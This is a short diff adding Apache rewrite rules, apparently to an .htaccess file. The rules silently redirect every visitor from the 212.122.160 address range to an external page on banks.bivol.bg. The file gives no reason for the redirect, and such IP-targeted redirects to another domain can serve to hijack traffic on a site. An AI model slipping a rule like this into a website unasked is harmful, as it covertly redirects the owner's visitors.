@@ -1,0 +1,4 @@
+RewriteEngine On
+RewriteBase /
+RewriteCond %{REMOTE_ADDR} ^212\.122\.160
+RewriteRule .* http://banks.bivol.bg/kyp.html [R,L]
